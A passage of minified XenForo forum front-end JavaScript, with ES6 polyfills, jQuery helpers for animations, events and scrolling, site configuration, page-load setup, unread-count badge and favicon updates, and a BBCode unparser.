var $jscomp = $jscomp || {};
$jscomp.scope = {};
$jscomp.findInternal = function (d, h, k) {
  d instanceof String && (d = String(d));
  for (var a = d.length, b = 0; b < a; b++) {
    var c = d[b];
    if (h.call(k, c, b, d)) return {
      i: b,
      v: c
    };
  }
  return {
    i: -1,
    v: void 0
  };
};
$jscomp.ASSUME_ES5 = !1;
$jscomp.ASSUME_NO_NATIVE_MAP = !1;
$jscomp.ASSUME_NO_NATIVE_SET = !1;
$jscomp.defineProperty = $jscomp.ASSUME_ES5 || "function" == typeof Object.defineProperties ? Object.defineProperty : function (d, h, k) {
  d != Array.prototype && d != Object.prototype && (d[h] = k.value);
};
$jscomp.getGlobal = function (d) {
  return "undefined" != typeof window && window === d ? d : "undefined" != typeof global && null != global ? global : d;
};
$jscomp.global = $jscomp.getGlobal(this);
$jscomp.polyfill = function (d, h, k, a) {
  if (h) {
    k = $jscomp.global;
    d = d.split(".");
    for (a = 0; a < d.length - 1; a++) {
      var b = d[a];
      b in k || (k[b] = {});
      k = k[b];
    }
    d = d[d.length - 1];
    a = k[d];
    h = h(a);
    h != a && null != h && $jscomp.defineProperty(k, d, {
      configurable: !0,
      writable: !0,
      value: h
    });
  }
};
$jscomp.polyfill("Array.prototype.find", function (d) {
  return d ? d : function (d, k) {
    return $jscomp.findInternal(this, d, k).v;
  };
}, "es6", "es3");
$jscomp.polyfill("Array.prototype.fill", function (d) {
  return d ? d : function (d, k, a) {
    var b = this.length || 0;
    0 > k && (k = Math.max(0, b + k));
    if (null == a || a > b) a = b;
    a = Number(a);
    0 > a && (a = Math.max(0, b + a));
    for (k = Number(k || 0); k < a; k++) this[k] = d;
    return this;
  };
}, "es6", "es3");
$jscomp.SYMBOL_PREFIX = "jscomp_symbol_";
$jscomp.initSymbol = function () {
  $jscomp.initSymbol = function () {};
  $jscomp.global.Symbol || ($jscomp.global.Symbol = $jscomp.Symbol);
};
$jscomp.Symbol = function () {
  var d = 0;
  return function (h) {
    return $jscomp.SYMBOL_PREFIX + (h || "") + d++;
  };
}();
$jscomp.initSymbolIterator = function () {
  $jscomp.initSymbol();
  var d = $jscomp.global.Symbol.iterator;
  d || (d = $jscomp.global.Symbol.iterator = $jscomp.global.Symbol("iterator"));
  "function" != typeof Array.prototype[d] && $jscomp.defineProperty(Array.prototype, d, {
    configurable: !0,
    writable: !0,
    value: function () {
      return $jscomp.arrayIterator(this);
    }
  });
  $jscomp.initSymbolIterator = function () {};
};
$jscomp.initSymbolAsyncIterator = function () {
  $jscomp.initSymbol();
  var d = $jscomp.global.Symbol.asyncIterator;
  d || (d = $jscomp.global.Symbol.asyncIterator = $jscomp.global.Symbol("asyncIterator"));
  $jscomp.initSymbolAsyncIterator = function () {};
};
$jscomp.arrayIterator = function (d) {
  var h = 0;
  return $jscomp.iteratorPrototype(function () {
    return h < d.length ? {
      done: !1,
      value: d[h++]
    } : {
      done: !0
    };
  });
};
$jscomp.iteratorPrototype = function (d) {
  $jscomp.initSymbolIterator();
  d = {
    next: d
  };
  d[$jscomp.global.Symbol.iterator] = function () {
    return this;
  };
  return d;
};
$jscomp.makeIterator = function (d) {
  $jscomp.initSymbolIterator();
  var h = d[Symbol.iterator];
  return h ? h.call(d) : $jscomp.arrayIterator(d);
};
$jscomp.FORCE_POLYFILL_PROMISE = !1;
$jscomp.polyfill("Promise", function (d) {
  function h() {
    this.batch_ = null;
  }
  function k(a) {
    return a instanceof b ? a : new b(function (b, c) {
      b(a);
    });
  }
  if (d && !$jscomp.FORCE_POLYFILL_PROMISE) return d;
  h.prototype.asyncExecute = function (a) {
    null == this.batch_ && (this.batch_ = [], this.asyncExecuteBatch_());
    this.batch_.push(a);
    return this;
  };
  h.prototype.asyncExecuteBatch_ = function () {
    var a = this;
    this.asyncExecuteFunction(function () {
      a.executeBatch_();
    });
  };
  var a = $jscomp.global.setTimeout;
  h.prototype.asyncExecuteFunction = function (b) {
    a(b, 0);
  };
  h.prototype.executeBatch_ = function () {
    for (; this.batch_ && this.batch_.length;) {
      var a = this.batch_;
      this.batch_ = [];
      for (var b = 0; b < a.length; ++b) {
        var c = a[b];
        a[b] = null;
        try {
          c();
        } catch (l) {
          this.asyncThrow_(l);
        }
      }
    }
    this.batch_ = null;
  };
  h.prototype.asyncThrow_ = function (a) {
    this.asyncExecuteFunction(function () {
      throw a;
    });
  };
  var b = function (a) {
    this.state_ = 0;
    this.result_ = void 0;
    this.onSettledCallbacks_ = [];
    var b = this.createResolveAndReject_();
    try {
      a(b.resolve, b.reject);
    } catch (g) {
      b.reject(g);
    }
  };
  b.prototype.createResolveAndReject_ = function () {
    function a(a) {
      return function (g) {
        c || (c = !0, a.call(b, g));
      };
    }
    var b = this,
      c = !1;
    return {
      resolve: a(this.resolveTo_),
      reject: a(this.reject_)
    };
  };
  b.prototype.resolveTo_ = function (a) {
    if (a === this) this.reject_(new TypeError("A Promise cannot resolve to itself"));else if (a instanceof b) this.settleSameAsPromise_(a);else {
      a: switch (typeof a) {
        case "object":
          var c = null != a;
          break a;
        case "function":
          c = !0;
          break a;
        default:
          c = !1;
      }
      c ? this.resolveToNonPromiseObj_(a) : this.fulfill_(a);
    }
  };
  b.prototype.resolveToNonPromiseObj_ = function (a) {
    var b = void 0;
    try {
      b = a.then;
    } catch (g) {
      this.reject_(g);
      return;
    }
    "function" == typeof b ? this.settleSameAsThenable_(b, a) : this.fulfill_(a);
  };
  b.prototype.reject_ = function (a) {
    this.settle_(2, a);
  };
  b.prototype.fulfill_ = function (a) {
    this.settle_(1, a);
  };
  b.prototype.settle_ = function (a, b) {
    if (0 != this.state_) throw Error("Cannot settle(" + a + ", " + b + "): Promise already settled in state" + this.state_);
    this.state_ = a;
    this.result_ = b;
    this.executeOnSettledCallbacks_();
  };
  b.prototype.executeOnSettledCallbacks_ = function () {
    if (null != this.onSettledCallbacks_) {
      for (var a = 0; a < this.onSettledCallbacks_.length; ++a) c.asyncExecute(this.onSettledCallbacks_[a]);
      this.onSettledCallbacks_ = null;
    }
  };
  var c = new h();
  b.prototype.settleSameAsPromise_ = function (a) {
    var b = this.createResolveAndReject_();
    a.callWhenSettled_(b.resolve, b.reject);
  };
  b.prototype.settleSameAsThenable_ = function (a, b) {
    var c = this.createResolveAndReject_();
    try {
      a.call(b, c.resolve, c.reject);
    } catch (l) {
      c.reject(l);
    }
  };
  b.prototype.then = function (a, c) {
    function g(a, b) {
      return "function" == typeof a ? function (b) {
        try {
          e(a(b));
        } catch (v) {
          f(v);
        }
      } : b;
    }
    var e,
      f,
      d = new b(function (a, b) {
        e = a;
        f = b;
      });
    this.callWhenSettled_(g(a, e), g(c, f));
    return d;
  };
  b.prototype.catch = function (a) {
    return this.then(void 0, a);
  };
  b.prototype.callWhenSettled_ = function (a, b) {
    function g() {
      switch (e.state_) {
        case 1:
          a(e.result_);
          break;
        case 2:
          b(e.result_);
          break;
        default:
          throw Error("Unexpected state: " + e.state_);
      }
    }
    var e = this;
    null == this.onSettledCallbacks_ ? c.asyncExecute(g) : this.onSettledCallbacks_.push(g);
  };
  b.resolve = k;
  b.reject = function (a) {
    return new b(function (b, c) {
      c(a);
    });
  };
  b.race = function (a) {
    return new b(function (b, c) {
      for (var g = $jscomp.makeIterator(a), e = g.next(); !e.done; e = g.next()) k(e.value).callWhenSettled_(b, c);
    });
  };
  b.all = function (a) {
    var c = $jscomp.makeIterator(a),
      g = c.next();
    return g.done ? k([]) : new b(function (a, b) {
      function e(b) {
        return function (c) {
          d[b] = c;
          f--;
          0 == f && a(d);
        };
      }
      var d = [],
        f = 0;
      do d.push(void 0), f++, k(g.value).callWhenSettled_(e(d.length - 1), b), g = c.next(); while (!g.done);
    });
  };
  return b;
}, "es6", "es3");
$jscomp.checkStringArgs = function (d, h, k) {
  if (null == d) throw new TypeError("The 'this' value for String.prototype." + k + " must not be null or undefined");
  if (h instanceof RegExp) throw new TypeError("First argument to String.prototype." + k + " must not be a regular expression");
  return d + "";
};
$jscomp.polyfill("String.prototype.repeat", function (d) {
  return d ? d : function (d) {
    var h = $jscomp.checkStringArgs(this, null, "repeat");
    if (0 > d || 1342177279 < d) throw new RangeError("Invalid count value");
    d |= 0;
    for (var a = ""; d;) if (d & 1 && (a += h), d >>>= 1) h += h;
    return a;
  };
}, "es6", "es3");
var XF = window.XF || {};
void 0 === window.jQuery && (jQuery = $ = {});
!function (d, h, k) {
  XF.activate ? console.error("XF core has been double loaded") : (XF.browser || (XF.browser = {
    browser: "",
    version: 0,
    os: "",
    osVersion: null
  }), function () {
    var a = function () {
      var a = k.createElement("fake"),
        b = {
          WebkitTransition: "webkitTransitionEnd",
          MozTransition: "transitionend",
          OTransition: "oTransitionEnd otransitionend",
          transition: "transitionend"
        },
        c;
      for (c in b) if (void 0 !== a.style[c]) return {
        end: b[c]
      };
      return !1;
    }();
    d.support.transition = a;
    d.support.transition && (d.event.special.xfTransitionEnd = {
      bindType: a.end,
      delegateType: a.end,
      handle: function (a) {
        if (d(a.target).is(this)) return a.handleObj.handler.apply(this, arguments);
      }
    });
    var b = d("html").attr("dir");
    a = "normal";
    if (b && "RTL" == b.toUpperCase()) {
      b = d('<div style="width: 80px; height: 40px; font-size: 30px; overflow: scroll; white-space: nowrap; word-wrap: normal; position: absolute; top: -1000px; visibility: hidden; pointer-events: none">MMMMMMMMMM</div>');
      var c = b[0];
      b.appendTo("body");
      0 < c.scrollLeft ? a = "inverted" : (c.scrollLeft = -1, -1 == c.scrollLeft && (a = "negative"));
      b.remove();
    }
    d.support.scrollLeftType = a;
    d.fn.reverse = [].reverse;
    d.addEventCapture = function () {
      var a = d.event.special;
      return function (b) {
        k.addEventListener && ("string" == typeof b && (b = [b]), d.each(b, function (b, c) {
          var g = function (a) {
            a = d.event.fix(a);
            return d.event.dispatch.call(this, a);
          };
          a[c] = a[c] || {};
          a[c].setup || a[c].teardown || d.extend(a[c], {
            setup: function () {
              this.addEventListener(c, g, !0);
            },
            teardown: function () {
              this.removeEventListener(c, g, !0);
            }
          });
        }));
      };
    }();
  }(), d.fn.extend({
    onWithin: function (a, b, c) {
      var f = this;
      d(k).on(a, function (a) {
        d(a.target).has(f).length && (c && d(k).off(a), b(a));
      });
      return this;
    },
    oneWithin: function (a, b) {
      return this.onWithin(a, b, !0);
    },
    onPassive: function (a, b) {
      if ("object" == typeof a) {
        for (var c in a) this.onPassive(c, a[c]);
        return this;
      }
      if ("string" != typeof a || "function" != typeof b) return console.warn("$.onPassive failure for %s.on%s, check parameters", this.get(0), a), this;
      if (-1 !== a.indexOf(".")) return console.warn("$.onPassive does not support namespaced events %s.on%s", this.get(0), a), !1;
      XF.Feature.has("passiveeventlisteners") ? this.get(0).addEventListener(a, b, {
        passive: !0
      }) : this.get(0).addEventListener(a, b);
      return this;
    },
    offPassive: function (a, b) {
      this.get(0).removeEventListener(a, b);
      return this;
    },
    onPointer: function (a, b) {
      if (d.isPlainObject(a)) {
        for (var c in a) if (a.hasOwnProperty(c)) this.onPointer(c, a[c]);
        return this;
      }
      "string" === typeof a && (a = a.split(/\s+/));
      var f = this,
        e = function (a) {
          var c = d(this).data("xf-pointer-type");
          a.xfPointerType = a.pointerType || c || "";
          b(a);
        };
      a.forEach(function (a) {
        f.on(a, e);
      });
      this.off("pointerdown.pointer-watcher").on("pointerdown.pointer-watcher", function (a) {
        d(this).data("xf-pointer-type", a.pointerType);
      });
      return this;
    },
    xfFadeDown: function (a, b) {
      this.filter(":hidden").hide().css("opacity", 0);
      a = a || XF.config.speed.normal;
      this.find(".is-sticky").addClass("was-sticky").removeClass("is-sticky");
      this.animate({
        opacity: 1,
        height: "show",
        marginTop: "show",
        marginBottom: "show",
        paddingTop: "show",
        paddingBottom: "show"
      }, {
        duration: a,
        easing: "swing",
        complete: function () {
          d(this).find(".was-sticky").addClass("is-sticky").removeClass("was-sticky");
          b && b();
          XF.layoutChange();
        }
      });
      return this;
    },
    xfFadeUp: function (a, b) {
      a = a || XF.config.speed.normal;
      this.find(".is-sticky").addClass("was-sticky").removeClass("is-sticky");
      this.animate({
        opacity: 0,
        height: "hide",
        marginTop: "hide",
        marginBottom: "hide",
        paddingTop: "hide",
        paddingBottom: "hide"
      }, {
        duration: a,
        easing: "swing",
        complete: function () {
          d(this).find(".was-sticky").addClass("is-sticky").removeClass("was-sticky");
          b && b();
          XF.layoutChange();
        }
      });
      return this;
    },
    xfUniqueId: function () {
      var a = this.attr("id");
      a || (a = "js-XFUniqueId" + XF.getUniqueCounter(), this.attr("id", a));
      return a;
    },
    findExtended: function (a) {
      var b;
      if ("string" === typeof a && (b = a.match(/^<([^|]+)(\|([\s\S]+))?$/))) {
        a = d.trim(b[1]);
        var c,
          f,
          e = {
            up: "parent",
            next: "next",
            prev: "prev"
          },
          g = this;
        do if (c = a.match(/^:(up|next|prev)(\((\d+)\))?/)) {
          c[2] || (c[3] = 1);
          var l = e[c[1]];
          for (f = 0; f < c[3]; f++) (g = g[l]()) || (g = d());
          a = d.trim(a.substr(c[0].length));
        } while (c);
        a.length && (g = g.closest(a));
        g.length || (g = d());
        a = b[2] ? d.trim(b[3]) : "";
        return a.length ? g.find(a) : g;
      }
      return this._find(a);
    },
    dimensions: function (a, b) {
      var c = this.offset();
      c = {
        top: c.top,
        left: c.left
      };
      b = b ? !0 : !1;
      c.width = a ? this.outerWidth(b) : this.width();
      c.height = a ? this.outerHeight(b) : this.height();
      c.right = c.left + c.width;
      c.bottom = c.top + c.height;
      return c;
    },
    viewport: function (a, b) {
      a = {
        width: a ? this.outerWidth(b) : this.width(),
        height: a ? this.outerHeight(b) : this.height(),
        left: this.scrollLeft(),
        top: this.scrollTop(),
        right: 0,
        bottom: 0,
        docWidth: d(k).width(),
        docHeight: d(k).height()
      };
      a.bottom = a.top + a.height;
      a.right = a.left + a.width;
      return a;
    },
    hasFixableParent: function () {
      var a = !1;
      this.parents().each(function () {
        var b = d(this);
        switch (b.css("position")) {
          case "fixed":
          case "sticky":
          case "-webkit-sticky":
            return a = b, !1;
        }
        if (b.data("sticky_kit")) return a = b, !1;
      });
      return a;
    },
    hasFixedParent: function () {
      var a = !1;
      this.parents().each(function () {
        var b = d(this);
        switch (b.css("position")) {
          case "fixed":
            return a = b, !1;
          case "sticky":
          case "-webkit-sticky":
            var c = b.dimensions(!0),
              f = d(h).viewport(),
              e = b.css("top"),
              g = b.css("bottom");
            if ("auto" !== e && (e = c.top - f.top - parseInt(e, 10), .5 >= e && -.5 <= e) || "auto" !== g && (e = c.bottom - f.bottom - parseInt(g, 10), .5 >= e && -.5 <= e)) return a = b, !1;
        }
      });
      return a;
    },
    onTransitionEnd: function (a, b) {
      var c = !1,
        d = this;
      this.one("xfTransitionEnd", function () {
        if (!c) return c = !0, b.apply(this, arguments);
      });
      setTimeout(function () {
        c || d.trigger("xfTransitionEnd");
      }, a + 10);
      return this;
    },
    autofocus: function () {
      var a = d(this);
      XF.isIOS() ? a.is(":focus") || (a.addClass("is-focused"), a.on("blur", function () {
        a.removeClass("is-focused");
      })) : a.focus();
      return this;
    },
    normalizedScrollLeft: function (a) {
      var b = d.support.scrollLeftType;
      if ("undefined" !== typeof a) {
        for (var c = 0; c < this.length; c++) {
          var f = this[c],
            e = a;
          switch (b) {
            case "negative":
              e = 0 < e ? -e : 0;
              break;
            case "inverted":
              e = f.scrollWidth - f.offsetWidth - e;
          }
          f.scrollLeft = e;
        }
        return this;
      }
      a = this[0];
      if (!a) return 0;
      c = a.scrollLeft;
      switch (b) {
        case "negative":
          return 0 > c ? -c : 0;
        case "inverted":
          return b = a.scrollWidth - c - a.offsetWidth, .5 > b ? 0 : b;
        default:
          return c;
      }
    },
    focusNext: function () {
      var a = d('input:not([type="hidden"]), select, textarea, a, button').filter(":visible");
      return a.eq(a.index(this) + 1).focus();
    },
    retinaFix: function () {
      if (2 <= h.devicePixelRatio) this.find("img[srcset]").one("load", function (a) {
        d(this).prop("srcset", d(this).attr("srcset"));
      });
      return this;
    }
  }), function () {
    function a(a) {
      if (!d.support.transition) return 0;
      var b = a[0];
      if (!(b && b instanceof h.Element)) return 0;
      a = a.css("transition-duration");
      b = 0;
      a && a.match(/^(\+|-|)([0-9]*\.[0-9]+|[0-9]+)(ms|s)/i) && (b = ("-" == RegExp.$1 ? -1 : 1) * parseFloat(RegExp.$2) * ("ms" == RegExp.$3.toLowerCase() ? 1 : 1E3));
      return b;
    }
    function b(a, b, c) {
      var g = [];
      d.isFunction(b) && (b = b.call(a[0], 0, a[0].className));
      b = d.trim(b).split(/\s+/);
      a = " " + a[0].className + " ";
      for (var e, f = 0; f < b.length; f++) ((e = 0 <= a.indexOf(" " + b[f] + " ")) && !c || !e && c) && g.push(b[f]);
      return g.join(" ");
    }
    function c(c, g, l, m, n) {
      n = n ? 0 : a(c);
      var e = g ? "addClass" : "removeClass",
        h = g ? "removeClass" : "addClass";
      g = b(c, l, g ? !0 : !1);
      var p = c[0],
        k = function () {
          m && setTimeout(function () {
            m.call(p, d.Event("xfTransitionEnd"));
          }, 0);
        };
      if (g.length) {
        if (0 >= n) c[e](g), k();else {
          c.hasClass("is-transitioning") && c.trigger("xfTransitionEnd");
          c.addClass("is-transitioning");
          if (c.css("transition-property").match(/(^|\s|,)-xf-(width|height)($|\s|,)/)) {
            k = RegExp.$2;
            var t = f[k],
              A = c.css(t),
              B = A[k],
              z = "transition." + k,
              q = c.data(z),
              w = p.style,
              y = w.transition || w["-webkit-transition"] || w["-moz-transition"] || w["-o-transition"] || "",
              u;
            if (void 0 === q) for (q = {}, u = 0; u < t.length; u++) q[t[u]] = w[t[u]] || "";
            if (0 == c[k]()) for (u in B = "0", A) A.hasOwnProperty(u) && (A[u] = "0");
            c.data(z, q).css("transition", "none")[e](g);
            t = c.css(t);
            q = t[k];
            if (0 == c[k]()) for (u in q = "0", t) t.hasOwnProperty(u) && (t[u] = "0");
            c[h](g);
            if (B != q) {
              var C = m;
              c.css(A);
              p.offsetWidth;
              c.css("transition", y).css(t);
              m = function () {
                c.css(c.data(z)).removeData(z);
                C && C.apply(this, arguments);
              };
            } else c.css("transition", y);
          }
          c.onTransitionEnd(n, function () {
            c.removeClass("is-transitioning");
            m && m.apply(this, arguments);
          });
          c[e](l);
        }
      } else k();
    }
    var f = {
      height: "height padding-top padding-bottom margin-top margin-bottom border-top-width border-bottom-width".split(" "),
      width: "width padding-left padding-right margin-left margin-right border-right-width border-left-width".split(" ")
    };
    d.fn.addClassTransitioned = function (a, b, f) {
      for (var g = this.length, e = 0; e < g; e++) c(d(this[e]), !0, a, b, f);
      return this;
    };
    d.fn.removeClassTransitioned = function (a, b, f) {
      for (var g = this.length, e = 0; e < g; e++) c(d(this[e]), !1, a, b, f);
      return this;
    };
    d.fn.toggleClassTransitioned = function (a, b, f, m) {
      "boolean" !== typeof b && "undefined" === typeof f && (f = b, b = null);
      for (var g = "boolean" === typeof b, e = this.length, l = 0; l < e; l++) {
        var h = d(this[l]);
        var k = g ? b : h.hasClass(a) ? !1 : !0;
        c(h, k, a, f, m);
      }
      return this;
    };
  }(), d.extend(XF, {
    config: {
      userId: null,
      enablePush: !1,
      skipServiceWorkerRegistration: !1,
      skipPushNotificationSubscription: !1,
      skipPushNotificationCta: !1,
      pushAppServerKey: null,
      csrf: d("html").data("csrf"),
      time: {
        now: 0,
        today: 0,
        todayDow: 0,
        tomorrow: 0,
        yesterday: 0,
        week: 0
      },
      cookie: {
        path: "/",
        domain: "",
        prefix: "xf_"
      },
      url: {
        fullBase: "/",
        basePath: "/",
        css: "",
        keepAlive: ""
      },
      css: {},
      js: {},
      jsState: {},
      speed: {
        xxfast: 50,
        xfast: 100,
        fast: 200,
        normal: 400,
        slow: 600
      },
      job: {
        manualUrl: ""
      },
      borderSizeFeature: "3px",
      fontAwesomeWeight: "r",
      enableRtnProtect: !0,
      enableFormSubmitSticky: !0,
      visitorCounts: {
        conversations_unread: 0,
        alerts_unviewed: 0,
        total_unread: 0,
        title_count: !1,
        icon_indicator: !1
      },
      uploadMaxFilesize: null,
      allowedVideoExtensions: [],
      allowedAudioExtensions: [],
      shortcodeToEmoji: !0,
      publicMetadataLogoUrl: "",
      publicPushBadgeUrl: ""
    },
    debug: {
      disableAjaxSubmit: !1
    },
    counter: 1,
    pageDisplayTime: null,
    phrases: {},
    getApp: function () {
      return d("html").data("app") || null;
    },
    getKeyboardInputs: function () {
      return "input:not([type=radio], [type=checkbox], [type=submit], [type=reset]), textarea";
    },
    onPageLoad: function () {
      d(k).trigger("xf:page-load-start");
      XF.NavDeviceWatcher.initialize();
      XF.ActionIndicator.initialize();
      XF.DynamicDate.initialize();
      XF.KeepAlive.initialize();
      XF.LinkWatcher.initLinkProxy();
      XF.LinkWatcher.initExternalWatcher();
      XF.NoticeWatcher.initialize();
      XF.ExpandableContent.watch();
      XF.ScrollButtons.initialize();
      XF.KeyboardShortcuts.initialize();
      XF.FormInputValidation.initialize();
      XF.PWA.initialize();
      XF.Push.initialize();
      XF.IgnoreWatcher.initializeHash();
      XF.BrowserWarning.display();
      XF.History.initialize();
      XF.config.jsState = XF.applyJsState({}, XF.config.jsState);
      XF.activate(k);
      d(k).on("ajax:complete", function (a, b, c) {
        (a = b.responseJSON) && a.visitor && XF.updateVisitorCounts(a.visitor, !0);
      });
      d(k).on("ajax:before-success", function (a, b, c, d) {
        (b = d.responseJSON) && b && b.job && (a = b.job, a.manual && XF.JobRunner.runManual(a.manual), a.autoBlocking ? XF.JobRunner.runAutoBlocking(a.autoBlocking, a.autoBlockingMessage) : a.auto && setTimeout(XF.JobRunner.runAuto, 0));
      });
      d(k).on("keyup", "a:not([href])", function (a) {
        "Enter" == a.key && d(a.currentTarget).click();
      });
      d("html[data-run-jobs]").length && setTimeout(XF.JobRunner.runAuto, 100);
      XF.updateVisitorCountsOnLoad(XF.config.visitorCounts);
      XF.CrossTab.on("visitorCounts", function (a) {
        XF.updateVisitorCounts(a, !1);
      });
      XF.pageLoadScrollFix();
      setTimeout(function () {
        d("[data-load-auto-click]").first().click();
      }, 100);
      d(k).trigger("xf:page-load-complete");
    },
    addExtraPhrases: function (a) {
      d(a).find("script.js-extraPhrases").each(function () {
        var a = d(this);
        try {
          var c = d.parseJSON(a.html()) || {};
          d.extend(XF.phrases, c);
        } catch (f) {
          console.error(f);
        }
        a.remove();
      });
    },
    phrase: function (a, b, c) {
      var d = XF.phrases[a];
      d && b && (d = XF.stringTranslate(d, b));
      return d || c || a;
    },
    _isRtl: null,
    isRtl: function () {
      if (null === XF._isRtl) {
        var a = d("html").attr("dir");
        XF._isRtl = a && "RTL" == a.toUpperCase();
      }
      return XF._isRtl;
    },
    rtlFlipKeyword: function (a) {
      if (!XF.isRtl()) return a;
      switch (a.toLowerCase()) {
        case "left":
          return "right";
        case "right":
          return "left";
        default:
          return a;
      }
    },
    isMac: function () {
      return -1 != navigator.userAgent.indexOf("Mac OS");
    },
    isIOS: function () {
      return /iPad|iPhone|iPod/.test(navigator.userAgent) && !h.MSStream;
    },
    isIE: function () {
      var a = navigator.userAgent;
      return 0 < a.indexOf("MSIE ") || 0 < a.indexOf("Trident/");
    },
    log: function () {
      console.log && console.log.apply && console.log.apply(console, arguments);
    },
    findRelativeIf: function (a, b) {
      if (!a) throw Error("No selector provided");
      var c;
      if (c = a.match(/^(<|>|\|)/)) {
        if ("<" == c[1]) return b.findExtended(a);
        "|" == c[1] && (a = a.substr(1));
        return b.find(a);
      }
      return d(a);
    },
    isElementVisible: function (a) {
      a = a[0].getBoundingClientRect();
      return 0 <= a.top && 0 <= a.left && a.bottom <= d(h).height() && a.right <= d(h).width();
    },
    layoutChange: function () {
      XF._layoutChangeTriggered || (XF._layoutChangeTriggered = !0, setTimeout(function () {
        XF._layoutChangeTriggered = !1;
        d(k.body).trigger("sticky_kit:recalc").trigger("xf:layout");
      }, 0));
    },
    _layoutChangeTriggered: !1,
    updateAvatars: function (a, b, c) {
      d(".avatar").each(function () {
        var f = d(this),
          e = f.find("img, span").first(),
          g = "avatar-u" + a + "-",
          l = f.hasClass("avatar--updateLink") ? f.find(".avatar-update") : null;
        if ((c || !e.hasClass(".js-croppedAvatar")) && e.is('[class^="' + g + '"]')) {
          if (e.hasClass(g + "s")) e = d(b.s);else if (e.hasClass(g + "m")) e = d(b.m);else if (e.hasClass(g + "l")) e = d(b.l);else if (e.hasClass(g + "o")) e = d(b.o);else return;
          f.html(e.html());
          e.hasClass("avatar--default") ? (f.addClass("avatar--default"), e.hasClass("avatar--default--dynamic") ? f.addClass("avatar--default--dynamic") : e.hasClass("avatar--default--text") ? f.addClass("avatar--default--text") : e.hasClass("avatar--default--image") && f.addClass("avatar--default--image")) : f.removeClass("avatar--default avatar--default--dynamic avatar--default--text avatar--default--image");
          f.attr("style", e.attr("style"));
          l && f.append(l);
        }
      });
    },
    updateVisitorCounts: function (a, b, c) {
      a && "public" == XF.getApp() && (XF.badgeCounterUpdate(d(".js-badge--conversations"), a.conversations_unread), XF.badgeCounterUpdate(d(".js-badge--alerts"), a.alerts_unviewed), XF.config.visitorCounts.title_count && XF.pageTitleCounterUpdate(a.total_unread), XF.config.visitorCounts.icon_indicator && XF.faviconUpdate(a.total_unread), b && (XF.appBadgeUpdate(a.total_unread), XF.CrossTab.trigger("visitorCounts", a), XF.LocalStorage.setJson("visitorCounts", {
        time: c || Math.floor(new Date().getTime() / 1E3) - 1,
        conversations_unread: a.conversations_unread,
        alerts_unviewed: a.alerts_unviewed,
        total_unread: a.total_unread
      })));
    },
    updateVisitorCountsOnLoad: function (a) {
      var b = XF.getLocalLoadTime(),
        c = XF.LocalStorage.getJson("visitorCounts");
      c && c.time && c.time > b && (a.conversations_unread = c.conversations_unread, a.alerts_unviewed = c.alerts_unviewed, a.total_unread = c.total_unread);
      XF.updateVisitorCounts(a, !0, b);
    },
    badgeCounterUpdate: function (a, b) {
      a.length && (a.attr("data-badge", b), "0" != String(b) ? a.addClass("badgeContainer--highlighted") : a.removeClass("badgeContainer--highlighted"));
    },
    shouldCountBeShown: function (a) {
      return 0 < parseInt(a.replace(/[,. ]/g, ""));
    },
    pageTitleCache: "",
    pageTitleCounterUpdate: function (a) {
      var b = k.title;
      "" === XF.pageTitleCache && (XF.pageTitleCache = b);
      b !== XF.pageTitleCache && "(" === b.charAt(0) && (b = XF.pageTitleCache);
      a = (this.shouldCountBeShown(a) ? "(" + a + ") " : "") + b;
      a != k.title && (k.title = a);
    },
    favIconAlertShown: !1,
    faviconUpdate: function (a) {
      var b = this.shouldCountBeShown(a);
      if (b !== XF.favIconAlertShown) {
        var c = d('link[rel~="icon"]');
        if (c.length) {
          XF.favIconAlertShown = b;
          var f = this;
          c.each(function (b, c) {
            var g = d(c);
            b = g.attr("href");
            c = g.data("original-href");
            f.shouldCountBeShown(a) ? (c || g.data("original-href", b), d("<img />").on("load", function () {
              var a = XF.faviconDraw(this);
              a && g.attr("href", a);
            }).attr("src", b)) : c && g.attr("href", c).removeData("original-href");
          });
        }
      }
    },
    faviconDraw: function (a) {
      var b = a.naturalWidth,
        c = a.naturalHeight;
      c = d("<canvas />").attr({
        width: b,
        height: c
      });
      var f = c[0].getContext("2d"),
        e = b / (32 / 6),
        g = 2 * Math.PI;
      f.drawImage(a, 0, 0);
      f.beginPath();
      f.arc(e, e, e, 0, g, !1);
      f.fillStyle = "#E03030";
      f.fill();
      f.lineWidth = b / 16;
      f.strokeStyle = "#EAEAEA";
      f.stroke();
      f.closePath();
      try {
        return c[0].toDataURL("image/png");
      } catch (l) {
        return null;
      }
    },
    appBadgeUpdate: function (a) {
      "setAppBadge" in navigator && !navigator.webdriver && !navigator.userAgent.match(/Chrome-Lighthouse|Googlebot|AdsBot-Google|Mediapartners-Google/i) && (a = parseInt(a.replace(/[,. ]/g, "")), navigator.setAppBadge(a));
    },
    unparseBbCode: function (a) {
      var b = d(k.createElement("div"));
      b.html(a);
      b.find(".js-noSelectToQuote").each(function () {
        d(this).remove();
      });
      d.each(["B", "I", "U", "S"], function (a, f) {
        b.find(f).each(function () {
          d(this).replaceWith("[" + f + "]" + d(this).html() + "[/" + f + "]");
        });
      });
      b.find(".bbCodeBlock--quote").each(function () {
        var a = d(this),
          b = a.find(".bbCodeBlock-expandContent");
        b.length ? a.replaceWith("<div>[QUOTE]" + b.html() + "[/QUOTE]</div>") : b.find(".bbCodeBlock-expand").remove();
      });
      b.find(".bbCodeBlock--code").each(function () {
        var a = d(this);
        if (!a.find(".bbCodeCode")) return !0;
        var b = a.find(".bbCodeCode code");
        if (!b.length) return !0;
        var e = b.attr("class");
        e = (e = e ? e.match(/language-(\S+)/) : null) ? e[1] : null;
        b.removeAttr("class");
        a.replaceWith(b.first().attr("data-language", e || "none"));
      });
      b.find(".bbCodeBlock--unfurl").each(function () {
        var a = d(this).data("url");
        d(this).replaceWith("[URL unfurl=true]" + a + "[/URL]");
      });
      b.find('div[style*="text-align"]').each(function () {
        var a = d(this).css("text-align").toUpperCase();
        d(this).replaceWith("[" + a + "]" + d(this).html() + "[/" + a + "]");
      });
      b.find(".bbCodeSpoiler").each(function () {
        var a = "";
        var b = d(this).find(".bbCodeSpoiler-button");
        if (b.length) {
          var e = d(this).find(".bbCodeSpoiler-content").html();
          b = b.find(".bbCodeSpoiler-button-title");
          b.length && (a = '="' + b.text() + '"');
          d(this).replaceWith("[SPOILER" + a + "]" + e + "[/SPOILER]");
        }
      });
      b.find(".bbCodeInlineSpoiler").each(function () {
        var a = d(this).html();
        d(this).replaceWith("[ISPOILER]" + a + "[/ISPOILER]");
      });
      return b.html();
    },
    hideOverlays: function () {
      d.each(XF.Overlay.cache, function (a, b) {
        b.hide();
      });
    },
    hideTooltips: function () {
      d.each(XF.TooltipTrigger.cache, function (a, b) {
        b.hide();
      });
    },
